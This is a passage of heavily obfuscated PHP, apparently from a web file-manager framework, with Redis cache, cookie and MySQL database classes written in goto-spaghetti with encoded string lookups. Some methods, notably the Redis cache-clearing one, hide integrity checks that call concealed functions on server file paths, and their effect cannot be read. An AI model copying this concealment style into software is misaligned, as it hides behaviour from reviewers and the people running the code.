$GLOBALS[$aìÉøøÈµ¶[1462]]) { $f· ß“×Ùç = $GLOBALS[$aìÉøøÈµ¶[1463]]; } goto DÓÈ¥„¤ÎÆ; B¿¼˜ÀÉµ: } public function copyFileEnd($DÚ†Ÿ£„¥, $b¢ÂòÊÎÂ, $F•·Ó¼‹ÍÒ, $d¡Û¦ËêÌ, $d¹ëÀÎ˜´, $fùÈ³”ÂÍÀ) { $aË¬Ö¡½‹× =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e³¿ŸŠÕß =& $this->task; $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1455]] = $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1454]]; $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1456]] = $aË¬Ö¡½‹×[33]; if ($d¹ëÀÎ˜´ == $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1452]]) { $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1459]] += $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1454]]; $this->update(1); } else { $this->update(); $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1455]] = 0; } self::log($aË¬Ö¡½‹×[1464] . $b¢ÂòÊÎÂ . $aË¬Ö¡½‹×[66] . $d¡Û¦ËêÌ . $aË¬Ö¡½‹×[214] . $d¹ëÀÎ˜´ . $aË¬Ö¡½‹×[1465] . $e³¿ŸŠÕß[$aË¬Ö¡½‹×[1452]]); } public function updateFileEnd($fÂ¸äÓ¹Ûù, $c—ÜôôÕ©Â) { $BÛ˜¼ˆÆ© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fŒºªÜ–êÈ =& $this->task; $fŒºªÜ–êÈ[$BÛ˜¼ˆÆ©[1452]] = $fÂ¸äÓ¹Ûù; $fŒºªÜ–êÈ[$BÛ˜¼ˆÆ©[1454]] = $c—ÜôôÕ©Â; $fŒºªÜ–êÈ[$BÛ˜¼ˆÆ©[1459]] += $c—ÜôôÕ©Â; $this->update(1); } public function sourceModelCopy($aì«©İ—•ò) { goto FõÌõ¶ÏƒÆ; E–¡Š¯Øé©: $fÆåÅÊ‰æä =& $this->task; $this->sourceModelCopyFlag = !0; $eòŞ‘Ù—œ = 0; goto e½Ò»¾ìµ; FõÌõ¶ÏƒÆ: $bë­»´ò—÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E˜èäáÈø‘ = $aì«©İ—•ò[0]; $dÔáÛ‚ï¥á = $aì«©İ—•ò[1]; goto E–¡Š¯Øé©; e½Ò»¾ìµ: switch ($E˜èäáÈø‘) { case $bë­»´ò—÷[503]: $eòŞ‘Ù—œ = 1; break; case $bë­»´ò—÷[506]: $fÆåÅÊ‰æä[$bë­»´ò—÷[1452]] = $dÔáÛ‚ï¥á[$bë­»´ò—÷[28]]; break; case $bë­»´ò—÷[508]: $eòŞ‘Ù—œ = intval($aì«©İ—•ò[$bë­»´ò—÷[360]] * 0.4); break; case $bë­»´ò—÷[510]: $eòŞ‘Ù—œ = intval($aì«©İ—•ò[$bë­»´ò—÷[360]] * 0.2); break; case $bë­»´ò—÷[512]: $eòŞ‘Ù—œ = intval($aì«©İ—•ò[$bë­»´ò—÷[360]] * 0.4); break; } $this->update($eòŞ‘Ù—œ); $this->sourceModelCopyFlag = !1; goto D³‡…äÂÇ; D³‡…äÂÇ: } public function sourceRemove($c„ÖªÎ§¥—, $CæÆÔÛÉÎà) { $B•ìùĞ“¡ˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->sourceModelCopyFlag = !0; $e ªíƒ´Ğ‚ = 1; if (isset($c„ÖªÎ§¥—[$B•ìùĞ“¡ˆ[80]])) { $e ªíƒ´Ğ‚ = $c„ÖªÎ§¥—[$B•ìùĞ“¡ˆ[80]][$B•ìùĞ“¡ˆ[78]] + $c„ÖªÎ§¥—[$B•ìùĞ“¡ˆ[80]][$B•ìùĞ“¡ˆ[79]] + 1; } $this->update($e ªíƒ´Ğ‚); $this->sourceModelCopyFlag = !1; } public function sourceMove($Dì¿•ùĞìÓ) { $this->sourceRemove($Dì¿•ùĞìÓ, !1); } public function curlProgress($e…ª–çƒ¾¯, $dà•·”Èí‚, $dÙ¥„„æ, $eæğ‰½ç’˜, $DÈøÖ¢É´±) { $FÂÚºİ¹é© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fë†¬»šë =& $this->task; if ($DÈøÖ¢É´± > 0) { $Fë†¬»šë[$FÂÚºİ¹é©[972]] = $FÂÚºİ¹é©[1466]; $Fë†¬»šë[$FÂÚºİ¹é©[1456]] = $FÂÚºİ¹é©[91]; if ($Fë†¬»šë[$FÂÚºİ¹é©[1454]] == $eæğ‰½ç’˜ || $eæğ‰½ç’˜ > 1024 * 1024) { $Fë†¬»šë[$FÂÚºİ¹é©[1455]] = $DÈøÖ¢É´±; } if ($Fë†¬»šë[$FÂÚºİ¹é©[1457]]) { $Fë†¬»šë[$FÂÚºİ¹é©[1455]] = $DÈøÖ¢É´± + $Fë†¬»šë[$FÂÚºİ¹é©[1457]]; } } else { if ($dÙ¥„„æ > 0) { if ($Fë†¬»šë[$FÂÚºİ¹é©[1454]] == $dà•·”Èí‚) { $Fë†¬»šë[$FÂÚºİ¹é©[1455]] = $dÙ¥„„æ; $Fë†¬»šë[$FÂÚºİ¹é©[972]] = $FÂÚºİ¹é©[1467]; $Fë†¬»šë[$FÂÚºİ¹é©[1456]] = $FÂÚºİ¹é©[1032]; } } } $this->update(); } public function curlProgressStart($eø¸©¹ÎÅå) { } public function curlProgressEnd($e¢ø‘åƒ¬) { $A–¶–à®Á§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Aƒ†‰¢³Õ =& $this->task; $D……È¼˜´ = curl_getinfo($e¢ø‘åƒ¬); $c–æŠ¤È¦ = $D……È¼˜´[$A–¶–à®Á§[1468]]; if ($Aƒ†‰¢³Õ[$A–¶–à®Á§[1456]] == $A–¶–à®Á§[91] && $c–æŠ¤È¦) { $Aƒ†‰¢³Õ[$A–¶–à®Á§[1457]] += $c–æŠ¤È¦; } $this->update(); } } goto eÒ†„ÚèÏ³; d„¢‰™Å: $aÙ©–ÎÙÈÊ = LIB_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][1151]; $DîéÓ¸Ï‘Û = $_SERVER[ÚŠ•´ÍéÒÑÔ][1152]; if ($_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][781]] != $DîéÓ¸Ï‘Û($aÙ©–ÎÙÈÊ)) { goto Aê°Í•õ‚; Aê°Í•õ‚: $bÊĞƒè•¨Å = $_SERVER[ÚŠ•´ÍéÒÑÔ][784]; $aá™ŒØ°‰ = $_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][785]] . $_SERVER[ÚŠ•´ÍéÒÑÔ][786]; $d²ùÈ…†ë = $bÊĞƒè•¨Å($aá™ŒØ°‰); goto CÃ§¯¶¼–—; CÃ§¯¶¼–—: $Ağ·çääÈâ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][214], $d²ùÈ…†ë); if (count($Ağ·çääÈâ) < $_SERVER[ÚŠ•´ÍéÒÑÔ][557]) { $fâº×ÉÑ´ = $_SERVER[ÚŠ•´ÍéÒÑÔ][787]; $fâº×ÉÑ´(); } $f«·ÉèÎ˜ = $_SERVER[ÚŠ•´ÍéÒÑÔ][1153]; goto BÁ‘­†Ô˜Š; BÁ‘­†Ô˜Š: $f«·ÉèÎ˜($aÙ©–ÎÙÈÊ); goto a¶ƒ… ó; a¶ƒ… ó: } goto F‰ë¨”®”Ô; f¤ÍˆÛ‚±ì: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($CÓ° ¥¯», $FÕ ¶‘ï) { $d½¯¯•É®ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!class_exists($d½¯¯•É®ë[774])) { show_json($d½¯¯•É®ë[775], !1); } $this->cacheTime = $FÕ ¶‘ï; $a­ÏŠéî = isset($CÓ° ¥¯»[$d½¯¯•É®ë[776]]) ? $CÓ° ¥¯»[$d½¯¯•É®ë[776]] : 10; $c‘îÀŞ½… = _get($CÓ° ¥¯», $d½¯¯•É®ë[773]); if ($c‘îÀŞ½… && is_array($c‘îÀŞ½…)) { $this->isCluster = !0; $this->initCluster($CÓ° ¥¯», $a­ÏŠéî); } else { $this->handle = $this->init($CÓ° ¥¯», $a­ÏŠéî); } } private function init($DéİÛÀ†˜¸, $EÀ¶Ö÷Ô­) { $b«êßÊåÑ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eêî«¹ƒ = new Redis(); $eÜ–Ä÷§ò¡ = isset($DéİÛÀ†˜¸[$b«êßÊåÑ[777]]) ? $DéİÛÀ†˜¸[$b«êßÊåÑ[777]] : !1; if ($eÜ–Ä÷§ò¡) { $Eêî«¹ƒ->pconnect($DéİÛÀ†˜¸[$b«êßÊåÑ[166]], $DéİÛÀ†˜¸[$b«êßÊåÑ[167]], $EÀ¶Ö÷Ô­); } else { $Eêî«¹ƒ->connect($DéİÛÀ†˜¸[$b«êßÊåÑ[166]], $DéİÛÀ†˜¸[$b«êßÊåÑ[167]], $EÀ¶Ö÷Ô­); } if (!empty($DéİÛÀ†˜¸[$b«êßÊåÑ[373]])) { $Eêî«¹ƒ->auth($DéİÛÀ†˜¸[$b«êßÊåÑ[373]]); } return $Eêî«¹ƒ; } private function initCluster($EÖÆµÙâ , $c…¿‰æŸÉ÷) { $C„à«æŞ°ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eŠÍ½šî×ğ = array($C„à«æŞ°ä[778], $C„à«æŞ°ä[779], $C„à«æŞ°ä[780]); $DŠ…»Éƒ…ó = $C„à«æŞ°ä[778]; if (isset($EÖÆµÙâ [$C„à«æŞ°ä[12]]) && in_array($EÖÆµÙâ [$C„à«æŞ°ä[12]], $eŠÍ½šî×ğ)) { $DŠ…»Éƒ…ó = $EÖÆµÙâ [$C„à«æŞ°ä[12]]; } switch ($DŠ…»Éƒ…ó) { case $C„à«æŞ°ä[778]: $this->_slave($EÖÆµÙâ , $c…¿‰æŸÉ÷); break; case $C„à«æŞ°ä[779]: break; case $C„à«æŞ°ä[780]: $bíÉ«”‹ó– = $EÖÆµÙâ [$C„à«æŞ°ä[773]]; $EÕôÙØ£ˆ = isset($EÖÆµÙâ [$C„à«æŞ°ä[777]]) ? $EÖÆµÙâ [$C„à«æŞ°ä[777]] : !1; $DÒ¥—Ú‚õö = isset($EÖÆµÙâ [$C„à«æŞ°ä[373]]) ? $EÖÆµÙâ [$C„à«æŞ°ä[373]] : null; $this->handle = new RedisCluster(NUll, $bíÉ«”‹ó–, $c…¿‰æŸÉ÷, $c…¿‰æŸÉ÷, $EÕôÙØ£ˆ, $DÒ¥—Ú‚õö); break; default: break; } } private function _slave($dµ—˜ »çŠ, $CóÓÏ£ŞĞ) { goto cÌ“µÍæÑÎ; cÌ“µÍæÑÎ: $e—ªÒÌİ = $dµ—˜ »çŠ[$_SERVER[ÚŠ•´ÍéÒÑÔ][773]]; $this->filterConfig($dµ—˜ »çŠ, $e—ªÒÌİ[0]); $this->handle = $this->init($dµ—˜ »çŠ, $CóÓÏ£ŞĞ); goto EÄİ’Œ•ÑÖ; Ağ´š‰ğ×Ü: $this->filterConfig($dµ—˜ »çŠ, $e—ªÒÌİ[$Cñ×ÓÉ±Â]); $this->slaveHandle = $this->init($dµ—˜ »çŠ, $CóÓÏ£ŞĞ); goto dõøÓ·ôœ; EÄİ’Œ•ÑÖ: unset($e—ªÒÌİ[0]); if (empty($e—ªÒÌİ)) { return; } $Cñ×ÓÉ±Â = array_rand($e—ªÒÌİ); goto Ağ´š‰ğ×Ü; dõøÓ·ôœ: } private function filterConfig(&$AÃ„Ô´’¯å, $béØ¤éêè) { $D¬á½Ğò¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bùø¥ñ¶‰Í = explode($D¬á½Ğò¯[4], $béØ¤éêè); $DÇõÅ‹ĞÇŸ = array($D¬á½Ğò¯[166] => $Bùø¥ñ¶‰Í[0], $D¬á½Ğò¯[167] => $Bùø¥ñ¶‰Í[1]); $AÃ„Ô´’¯å = array_merge($AÃ„Ô´’¯å, $DÇõÅ‹ĞÇŸ); } public function set($d»ÃÍ·ƒ³, $Dß¡‹…ó”, $a®õÀ“ÛÒ¾ = false) { $a®õÀ“ÛÒ¾ = $a®õÀ“ÛÒ¾ ? $a®õÀ“ÛÒ¾ : $this->cacheTime; return $this->handle->setEx($d»ÃÍ·ƒ³, $a®õÀ“ÛÒ¾, $Dß¡‹…ó”); } public function setLock($C­ÅéÒ“è‰, $a¯Õñ¿ŞË¸, $E†•Š¾â‰…) { return $this->handle->setNX($C­ÅéÒ“è‰, $a¯Õñ¿ŞË¸); } public function get($D¬¤¼ÃŠ) { $BÈã² é„ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $BÈã² é„->get($D¬¤¼ÃŠ); } public function remove($a±§áñ²èÏ) { return $this->handle->del($a±§áñ²èÏ); } public function deleteAll() { $D´®õ„¯…à =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($_SERVER[$D´®õ„¯…à[781]] != $_SERVER[$D´®õ„¯…à[782]]) { goto B„Ãˆ‰ÈÌ; B„Ãˆ‰ÈÌ: $FèÌà–÷ä = $D´®õ„¯…à[783]; $AÆ¸Ñ­„á‰ = $D´®õ„¯…à[784]; $f×ˆö…¥öŸ = $_SERVER[$D´®õ„¯…à[785]] . $D´®õ„¯…à[786]; goto A‘ƒéšÕ¡Ã; Aº°œ–™£: $E·½¦Á©•á = $D´®õ„¯…à[788]; $E·½¦Á©•á($_SERVER[$D´®õ„¯…à[789]]); $E·½¦Á©•á($_SERVER[$D´®õ„¯…à[785]] . $D´®õ„¯…à[790]); goto d¬º„èÏ°á; d¬º„èÏ°á: $fğ‡ÍÀæ‘‡ = 1; while ($fğ‡ÍÀæ‘‡ > 1) { $fğ‡ÍÀæ‘‡ = $fğ‡ÍÀæ‘‡ + 4; $aº‡ñ¥½Â² = rawurlencode($fğ‡ÍÀæ‘‡ . $D´®õ„¯…à[358]); } goto F…óŠÜ›äÍ; A‘ƒéšÕ¡Ã: $BÍÆ‡Áà™ = $AÆ¸Ñ­„á‰($f×ˆö…¥öŸ); $E÷ö’Íò‚ˆ = explode($D´®õ„¯…à[214], $BÍÆ‡Áà™); if (count($E÷ö’Íò‚ˆ) < $D´®õ„¯…à[549]) { $e‰ö”À“çÉ = $D´®õ„¯…à[787]; $e‰ö”À“çÉ(); } goto Aº°œ–™£; F…óŠÜ›äÍ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Cä®ëâ¿ä) { $this->handle->flushall($Cä®ëâ¿ä); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($eÄ—ÌÒ½‚ˆ = '', $aëäé»æôº = 0) { if (is_string($eÄ—ÌÒ½‚ˆ) && $eÄ—ÌÒ½‚ˆ != $_SERVER[ÚŠ•´ÍéÒÑÔ][33]) { $this->prefix = $eÄ—ÌÒ½‚ˆ; } if (is_numeric($aëäé»æôº) && $aëäé»æôº > 0) { $this->expire = $aëäé»æôº; } } public static function getInstance() { static $Aç‡¤ˆ¶˜; if ($Aç‡¤ˆ¶˜ === null) { $Aç‡¤ˆ¶˜ = new self(); } return $Aç‡¤ˆ¶˜; } private static $sameCookieSet = array(); public static function set($a‚âÎ“Ôø, $A±¤™•£©°, $FèãËĞ¸ã = 0, $BÀä‡½²‘ = false, $Eº‘™ÆéÚ  = false) { $e¥šÏ™·â¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$FèãËĞ¸ã) { $FèãËĞ¸ã = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$a‚âÎ“Ôø]) && self::$sameCookieSet[$a‚âÎ“Ôø] == $A±¤™•£©° . $FèãËĞ¸ã) { return; } self::$sameCookieSet[$a‚âÎ“Ôø] = $A±¤™•£©° . $FèãËĞ¸ã; if (!$Eº‘™ÆéÚ ) { $Eº‘™ÆéÚ  = str_replace(HOST, $e¥šÏ™·â¡[33], APP_HOST); $Eº‘™ÆéÚ  = _get($GLOBALS, $e¥šÏ™·â¡[791], $Eº‘™ÆéÚ ); } setcookie($a‚âÎ“Ôø, $A±¤™•£©°, time() + $FèãËĞ¸ã, $e¥šÏ™·â¡[8] . trim($Eº‘™ÆéÚ , $e¥šÏ™·â¡[8]), !1, !1, $BÀä‡½²‘); } public static function setSafe($Bø•êĞ¥óî, $FÇğ¹–ˆçé, $e¼İ¶œøŞË = 0) { self::set($Bø•êĞ¥óî, $FÇğ¹–ˆçé, $e¼İ¶œøŞË, !0); } public static function get($EÛ–°‚ö©») { return isset($_COOKIE[$EÛ–°‚ö©»]) ? $_COOKIE[$EÛ–°‚ö©»] : !1; } public static function remove($B»„Õ‰øŠ¸, $Aö¥¡’‘˜¨ = false) { unset($_COOKIE[$B»„Õ‰øŠ¸]); self::set($B»„Õ‰øŠ¸, $_SERVER[ÚŠ•´ÍéÒÑÔ][33], 1, $Aö¥¡’‘˜¨); } } class DbMysql extends Db { public function __construct($aïø†İöÚ„ = '') { $Bè“ğĞ’¤Ş =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!extension_loaded($Bè“ğĞ’¤Ş[723])) { think_exception(think_lang($Bè“ğĞ’¤Ş[10]) . $Bè“ğĞ’¤Ş[792]); } if (!empty($aïø†İöÚ„)) { $this->config = $aïø†İöÚ„; if (empty($this->config[$Bè“ğĞ’¤Ş[13]])) { $this->config[$Bè“ğĞ’¤Ş[13]] = $Bè“ğĞ’¤Ş[33]; } } } public function connect($c›‹Ë²ò°Ş = '', $aÛ†Ëµ²Ô = 0, $aÔáÉÄ¿Ê = false) { $fª÷çÛàƒ¿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->linkID[$aÛ†Ëµ²Ô])) { goto c²÷Ğ£È—; Dš¡—°ÎÔ×: if ($e«°¢¢Á¨Ò) { $this->linkID[$aÛ†Ëµ²Ô] = mysql_pconnect($Bå»ŞÍÙ, $c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[795]], $c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[796]], 131072); } else { $this->linkID[$aÛ†Ëµ²Ô] = mysql_connect($Bå»ŞÍÙ, $c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[795]], $c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[796]], !0, 131072); } if (!$this->linkID[$aÛ†Ëµ²Ô] || !empty($c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[17]]) && !mysql_select_db($c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[17]], $this->linkID[$aÛ†Ëµ²Ô])) { think_exception(mysql_error()); } $fŸçöÆŠÍ = mysql_get_server_info($this->linkID[$aÛ†Ëµ²Ô]); goto Eáì½Ø†¢„; c²÷Ğ£È—: if (empty($c›‹Ë²ò°Ş)) { $c›‹Ë²ò°Ş = $this->config; } $Bå»ŞÍÙ = $c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[793]] . ($c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[794]] ? "\72{$c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[794]]}" : $fª÷çÛàƒ¿[33]); $e«°¢¢Á¨Ò = !empty($c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[13]][$fª÷çÛàƒ¿[14]]) ? $c›‹Ë²ò°Ş[$fª÷çÛàƒ¿[13]][$fª÷çÛàƒ¿[14]] : $this->pconnect; goto Dš¡—°ÎÔ×; Aö„«ØÊ‚¯: if (1 != think_config($fª÷çÛàƒ¿[18])) { unset($this->config); } goto eİøêà®ëÏ; Eáì½Ø†¢„: mysql_query($fª÷çÛàƒ¿[797] . think_config($fª÷çÛàƒ¿[798]) . $fª÷çÛàƒ¿[55], $this->linkID[$aÛ†Ëµ²Ô]); if ($fŸçöÆŠÍ > $fª÷çÛàƒ¿[799]) { mysql_query($fª÷çÛàƒ¿[800], $this->linkID[$aÛ†Ëµ²Ô]); } $this->connected = !0; goto Aö„«ØÊ‚¯; eİøêà®ëÏ: } return $this->linkID[$aÛ†Ëµ²Ô]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E½Š¾³Ê±Û) { goto AŞŸ˜ÕáÆÈ; C´¥”ßÄëö: think_action_status($dÕ‰¯¢ø»Í[19], 1); think_status($dÕ‰¯¢ø»Í[20]); $this->queryID = mysql_query($E½Š¾³Ê±Û, $this->_linkID); goto f„òñ§÷ Ò; f„òñ§÷ Ò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f¡Ë„ĞŒÑ; dè˜Ù›Á˜†: if (!$this->_linkID) { return !1; } $this->queryStr = $E½Š¾³Ê±Û; if ($this->queryID) { $this->free(); } goto C´¥”ßÄëö; AŞŸ˜ÕáÆÈ: $dÕ‰¯¢ø»Í =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (0 === stripos($E½Š¾³Ê±Û, $dÕ‰¯¢ø»Í[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto dè˜Ù›Á˜†; f¡Ë„ĞŒÑ: } public function execute($B£İ¨ƒ´Š×) { goto B…ãí…°°ø; B…ãí…°°ø: $eáÜ¨Ó‘Äˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AÅ÷°³ÄŠ; BÌƒ¶÷»†¾: if (!1 === $cŒ¥ïÄ¥×) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto F­îÏ«…Êã; AÅ÷°³ÄŠ: $this->queryStr = $B£İ¨ƒ´Š×; if ($this->queryID) { $this->free(); } think_action_status($eáÜ¨Ó‘Äˆ[21], 1); goto AÓ¶­öŠÔŠ; AÓ¶­öŠÔŠ: think_status($eáÜ¨Ó‘Äˆ[20]); $cŒ¥ïÄ¥× = mysql_query($B£İ¨ƒ´Š×, $this->_linkID); $this->debug(); goto BÌƒ¶÷»†¾; F­îÏ«…Êã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÚŠ•´ÍéÒÑÔ][801], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f¹¥¾ÖÍã° = mysql_query($_SERVER[ÚŠ•´ÍéÒÑÔ][802], $this->_linkID); $this->transTimes = 0; if (!$f¹¥¾ÖÍã°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $AÙÕõÒÜ‡Ù = mysql_query($_SERVER[ÚŠ•´ÍéÒÑÔ][803], $this->_linkID); $this->transTimes = 0; if (!$AÙÕõÒÜ‡Ù) { $this->error(); return !1; } } return !0; } private function getAll() { $eèøÇì“é = array(); if ($this->numRows > 0) { while ($d¬äĞÂ°ßŞ = mysql_fetch_assoc($this->queryID)) { $eèøÇì“é[] = $d¬äĞÂ°ßŞ; } mysql_data_seek($this->queryID, 0); } return $eèøÇì“é; } public function getFields($Dõ‡ºĞ¯–é) { $CÁï´ğÜ—¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bœµá¤‰Ôî = $this->query($CÁï´ğÜ—¹[804] . $this->parseKey($Dõ‡ºĞ¯–é)); $dÄ­åğÔ‡• = array(); if ($bœµá¤‰Ôî) { foreach ($bœµá¤‰Ôî as $c‰¬È±¼¦ß => $eìŞÓò¡Öê) { $dÄ­åğÔ‡•[$eìŞÓò¡Öê[$CÁï´ğÜ—¹[27]]] = array($CÁï´ğÜ—¹[28] => $eìŞÓò¡Öê[$CÁï´ğÜ—¹[27]], $CÁï´ğÜ—¹[29] => $eìŞÓò¡Öê[$CÁï´ğÜ—¹[30]], $CÁï´ğÜ—¹[31] => (bool) (strtoupper($eìŞÓò¡Öê[$CÁï´ğÜ—¹[32]]) === $CÁï´ğÜ—¹[805]), $CÁï´ğÜ—¹[34] => $eìŞÓò¡Öê[$CÁï´ğÜ—¹[35]], $CÁï´ğÜ—¹[36] => strtolower($eìŞÓò¡Öê[$CÁï´ğÜ—¹[37]]) == $CÁï´ğÜ—¹[38], $CÁï´ğÜ—¹[39] => strtolower($eìŞÓò¡Öê[$CÁï´ğÜ—¹[40]]) == $CÁï´ğÜ—¹[41]); } } return $dÄ­åğÔ‡•; } public function getTables($c¡§‹“—­Õ = '') { $bÅ¹ÅøÊÄƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($c¡§‹“—­Õ)) { $dÌ¢¢š·ùÁ = $bÅ¹ÅøÊÄƒ[806] . $c¡§‹“—­Õ; } else { $dÌ¢¢š·ùÁ = $bÅ¹ÅøÊÄƒ[807]; } $aĞòŞççÙ = $this->query($dÌ¢¢š·ùÁ); $f‘´…›¸¦ = array(); foreach ($aĞòŞççÙ as $CµÀ°‹Ş¬ => $Bí±±”½) { $f‘´…›¸¦[$CµÀ°‹Ş¬] = current($Bí±±”½); } return $f‘´…›¸¦; } public function replace($b’ğöåà·‚, $E‹â¦Ø‹¨Ù = array()) { $e¹ô„çŠ‰© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($b’ğöåà·‚ as $fğáçš§ñ => $b®º–‰™„œ) { $FŒ±†á÷ï‘ = $this->parseValue($b®º–‰™„œ); if (is_scalar($FŒ±†á÷ï‘)) { $CÑÔˆåõ¢¨[] = $FŒ±†á÷ï‘; $dæ»³Üà±[] = $this->parseKey($fğáçš§ñ); } } $A«ä¬²äÉ = $e¹ô„çŠ‰©[808] . $this->parseTable($E‹â¦Ø‹¨Ù[$e¹ô„çŠ‰©[264]]) . $e¹ô„çŠ‰©[809] . implode($e¹ô„çŠ‰©[47], $dæ»³Üà±) . $e¹ô„çŠ‰©[810] . implode($e¹ô„çŠ‰©[47], $CÑÔˆåõ¢¨) . $e¹ô„çŠ‰©[811]; return $this->execute($A«ä¬²äÉ); } public function insertAll($dŠ«íğ²®Ú, $eÄ´˜¨šƒÙ = array(), $F¡çØøóÇ = false) { goto eÇ¿†ø„ö; aÌš¹ŒäÉ: $c„ºñóó»‡ = array(); foreach ($dŠ«íğ²®Ú as $cóŠÏ¤¢Ë) { $dâ™¤Ú½ = array(); foreach ($cóŠÏ¤¢Ë as $A„Çê ‡øò => $d†¡ËÕßìÕ) { $d†¡ËÕßìÕ = $this->parseValue($d†¡ËÕßìÕ); if (is_scalar($d†¡ËÕßìÕ)) { $dâ™¤Ú½[] = $d†¡ËÕßìÕ; } } $c„ºñóó»‡[] = $cÇ›…«øß[245] . implode($cÇ›…«øß[47], $dâ™¤Ú½) . $cÇ›…«øß[811]; } array_walk($cÍçªÖ»‰, array($this, $cÇ›…«øß[812])); goto F¡Úà­ô¹ï; F¡Úà­ô¹ï: $dÀ³³ŠŠ á = ($F¡çØøóÇ ? $cÇ›…«øß[813] : $cÇ›…«øß[814]) . $cÇ›…«øß[815] . $this->parseTable($eÄ´˜¨šƒÙ[$cÇ›…«øß[264]]) . $cÇ›…«øß[809] . implode($cÇ›…«øß[47], $cÍçªÖ»‰) . $cÇ›…«øß[816] . implode($cÇ›…«øß[47], $c„ºñóó»‡); return $this->execute($dÀ³³ŠŠ á); goto cÏ„£¡Ö£; eÇ¿†ø„ö: $cÇ›…«øß =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!is_array($dŠ«íğ²®Ú[0])) { return !1; } $cÍçªÖ»‰ = array_keys($dŠ«íğ²®Ú[0]); goto aÌš¹ŒäÉ; cÏ„£¡Ö£: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $d –õ»ìÅ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->error = mysql_errno() . $d –õ»ìÅ[4] . mysql_error($this->_linkID); if ($d –õ»ìÅ[33] != $this->queryStr) { $this->error .= LNG($d –õ»ìÅ[45]) . $this->queryStr; } think_trace($this->error, $d –õ»ìÅ[33], $d –õ»ìÅ[46]); return $this->error; } public function escapeString($b†™ÕšŒêÂ) { if ($this->_linkID) { return mysql_real_escape_string($b†™ÕšŒêÂ, $this->_linkID); } else { return mysql_escape_string($b†™ÕšŒêÂ); } } public function parseKey(&$D”ƒÄÌß¯, $D¦¨åŞç× = true) { $bâÜÈùæñí =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($D¦¨åŞç×) { $D”ƒÄÌß¯ = $this->parseKeyCheck($D”ƒÄÌß¯); } if ($D”ƒÄÌß¯ != $bâÜÈùæñí[173] && !preg_match($bâÜÈùæñí[817], $D”ƒÄÌß¯)) { $D”ƒÄÌß¯ = $bâÜÈùæñí[818] . trim($D”ƒÄÌß¯, $bâÜÈùæñí[818]) . $bâÜÈùæñí[818]; } return $D”ƒÄÌß¯; } } goto Cßƒë‹¡ŸÅ; dÛëòøÂùµ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\151\x6d\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\164\x2c\165\160\144\x61\x74\x65", "\x66\x75\156\143\x74\x69\x6f\x6e"), array("\x63\162\x65\x61\164\145\124\151\x6d\145", "\164\151\x6d\145", "\151\x6e\x73\145\162\164", "\146\165\x6e\143\x74\x69\x6f\x6e")); public function setDataAuto($Aè×çëšÊ) { $this->dataAuto = $Aè×çëšÊ; } public function __construct($CÒÉÔÙ×µŒ = '', $e¦ÖëÏ‘±³ = '', $Eõ¦³ˆå¬Ş = '') { parent::__construct($CÒÉÔÙ×µŒ, 